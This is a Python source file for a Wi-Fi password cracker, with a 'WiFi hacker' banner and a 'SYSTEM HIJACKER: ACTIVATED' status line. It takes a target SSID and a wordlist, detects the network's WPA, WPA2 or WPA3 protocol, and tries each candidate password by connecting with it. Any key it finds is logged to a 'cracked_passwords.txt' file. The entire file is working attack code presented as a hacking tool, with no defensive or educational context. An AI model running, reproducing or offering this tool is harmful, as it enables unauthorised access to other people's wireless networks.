import pywifi
from pywifi import const
import time
import sys
import os
from colorama import Fore, Back, Style, init

init(autoreset=True)

def show_banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    banner = rf"""
{Fore.CYAN}{Style.BRIGHT}  __      __.__  ___________.__    .__                   __                 
 /  \    /  \__| \_   _____/|__|   |  |__ _____    ____ |  | __ ___________ 
 \   \/\/   /  |  |    __)  |  |   |  |  \\__  \ _/ ___\|  |/ // __ \_  __ \
  \        /|  |  |     \   |  |   |   Y  \/ __ \\  \___|    <\  ___/|  | \/
   \__/\  / |__|  \___  /   |__|   |___|  (____  /\___  >__|_ \\___  >__|   
        \/            \/                \/     \/     \/     \/    \/       
    """
    print(banner)
    print(f"{Fore.RED}{Back.BLACK}{Style.BRIGHT} [!] SYSTEM STATUS: HACKER {Fore.WHITE}| {Fore.YELLOW}SYSTEM HIJACKER: ACTIVATED {Fore.RED}[!] ")
    print(f"{Fore.CYAN}{'='*75}\n")

def get_protocol_details(iface, target_ssid):
    """Scans and detects network security protocols (WPA, WPA2, WPA3)."""
    iface.scan()
    time.sleep(3)
    results = iface.scan_results()
    for network in results:
        if network.ssid == target_ssid:
            akm = network.akm
            # Detect WPA3 (often requires specific hardware support in pywifi/drivers)
            if hasattr(const, 'AKM_TYPE_SAE') and const.AKM_TYPE_SAE in akm:
                return "WPA3 (SAE)", const.AKM_TYPE_SAE
            # Detect WPA2
            if const.AKM_TYPE_WPA2PSK in akm:
                return "WPA2-PSK", const.AKM_TYPE_WPA2PSK
            # Detect WPA
            if const.AKM_TYPE_WPAPSK in akm:
                return "WPA-PSK", const.AKM_TYPE_WPAPSK
    return "UNKNOWN/WPA2", const.AKM_TYPE_WPA2PSK

def test_wifi(iface, ssid, password, timeout, akm_type):
    iface.disconnect()
    time.sleep(0.5)
    
    profile = pywifi.Profile()
    profile.ssid = ssid
    profile.auth = const.AUTH_ALG_OPEN
    profile.akm.append(akm_type)
    profile.cipher = const.CIPHER_TYPE_CCMP
    profile.key = password

    iface.remove_all_network_profiles()
    tmp_profile = iface.add_network_profile(profile)
    iface.connect(tmp_profile)

    start_time = time.time()
    while time.time() - start_time < timeout:
        if iface.status() == const.IFACE_CONNECTED:
            return True
        time.sleep(0.5)
    return False

def main():
    try:
        show_banner()
        ssid = input(f"{Fore.CYAN}1. target ssid: {Fore.WHITE}")
        wordlist_path = input(f"{Fore.CYAN}2. wordlist path: {Fore.WHITE}")
        try:
            delay = float(input(f"{Fore.CYAN}3. attempt delay (seconds): {Fore.WHITE}"))
        except:
            delay = 5.0 

        wifi = pywifi.PyWiFi()
        iface = wifi.interfaces()[0] 

        if not os.path.exists(wordlist_path):
            print(f"\n{Fore.RED}[!] WORDLIST NOT FOUND")
            return

        print(f"\n{Fore.YELLOW}[*] Identifying protocol for {ssid}...")
        proto_name, akm_type = get_protocol_details(iface, ssid)
        print(f"{Fore.GREEN}[+] Detected: {Fore.WHITE}{proto_name}")

        with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
            passwords = [line.strip() for line in f if line.strip()]

        total = len(passwords)
        print(f"{Fore.GREEN}[+] Starting injection. Rules: Skip all < 8 chars.")

        for i, pwd in enumerate(passwords, 1):
            # Strict Length Rule for WPA/WPA2/WPA3
            if len(pwd) < 8:
                sys.stdout.write(f"\r{Fore.RED}skipping (short) {Style.DIM}{pwd:<15} {Fore.CYAN}{i}/{total}")
                sys.stdout.flush()
                continue

            sys.stdout.write(f"\r{Fore.YELLOW}testing {Style.DIM}{pwd:<15} {Fore.CYAN}{i}/{total}")
            sys.stdout.flush()

            if test_wifi(iface, ssid, pwd, delay, akm_type):
                print(f"\n\n{Fore.GREEN}{Style.BRIGHT}Success! Password: {pwd}")
                with open("cracked_passwords.txt", "a") as log:
                    log.write(f"DATE: {time.ctime()} | SSID: {ssid} | KEY: {pwd}\n")
                return
            
        print(f"\n\n{Fore.RED}[!] Scan complete. No matches found.")

    except KeyboardInterrupt:
        print(f"\n\n{Fore.RED}{Style.BRIGHT}It's not me!{Style.RESET_ALL}")
        sys.exit()

if __name__ == "__main__":
    main()
